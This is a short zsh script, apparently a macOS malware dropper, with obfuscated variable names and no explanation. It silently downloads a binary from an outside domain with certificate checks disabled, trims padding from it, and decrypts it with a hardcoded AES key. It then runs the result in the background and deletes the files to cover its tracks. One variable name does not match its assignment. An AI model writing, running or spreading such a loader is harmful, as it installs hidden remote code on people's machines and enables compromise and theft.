#!/bin/zsh
pegs9=$(mktemp /tmp/ds9uaw.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m70bf4f8568226fc2.bin" -o "$pegs9z" || exit 1
wysb4r=$(stat -f %z "$pegs9z"); rqtcjp5=$(( wysb4r - 1757 - 3606 ))
tail -c +$(( 1757 + 1 )) "$pegs9z" | head -c $rqtcjp5 | openssl enc -d -aes-256-cbc -k ea6eb27fab01ee04114d5071 -out "$pegs9" 2>/dev/null
[ -s "$pegs9" ] && chmod 700 "$pegs9" && ( "$pegs9" & ) && disown
( sleep 3; rm -f "$pegs9" "$pegs9z" ) &>/dev/null &
